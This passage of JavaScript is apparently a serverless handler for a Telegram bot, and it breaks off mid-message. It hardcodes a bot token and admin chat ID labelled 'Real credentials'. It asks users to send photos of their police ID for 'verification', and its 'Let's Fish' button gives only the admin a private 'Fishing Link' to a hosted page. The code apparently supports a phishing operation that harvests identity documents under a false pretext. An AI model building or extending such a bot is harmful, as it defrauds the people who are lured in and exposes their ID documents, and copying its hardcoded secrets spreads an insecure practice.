
// 🔐 Real credentials
const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
const ADMIN_CHAT_ID = '7216371031';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

const policeRequests = new Map(); // stores verified status

export default async function handler(req, res) {
  if (req.method === 'GET') return res.status(200).send('🟢 Bot is alive!');
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  const body = req.body;
  const message = body.message || body.callback_query?.message;
  const chatId = message?.chat?.id;
  const text = message?.text;
  const callbackQuery = body.callback_query;
  const photo = message?.photo;

  try {
    // ✅ /start
    if (text === '/start') {
      await sendWelcomeWithButtons(chatId);
      return res.status(200).send('OK');
    }

    // 🛂 Police Enquiry Button
    if (callbackQuery?.data === 'police') {
      await sendMessageNoMarkdown(
        callbackQuery.message.chat.id,
        `🛂 Police Verification Required\n\n📸 Please send a clear photo of your Police ID.\nOur admin will verify and give you access to confidential resources.`
      );
      await answerCallback(callbackQuery.id);
      return res.status(200).send('OK');
    }

    // 🎣 Let’s Fish Button — FIXED FOR ADMIN
    if (callbackQuery?.data === 'fishing') {
      const userId = callbackQuery.message.chat.id.toString();
      const isAdmin = userId === ADMIN_CHAT_ID;

      if (isAdmin) {
        await sendMessageNoMarkdown(
          userId,
          `🎣 Fishing Link (Private)\n🔗 https://heavenscake.vercel.app/page.html`
        );
      } else {
        await sendMessageNoMarkdown(
          userId,
          `
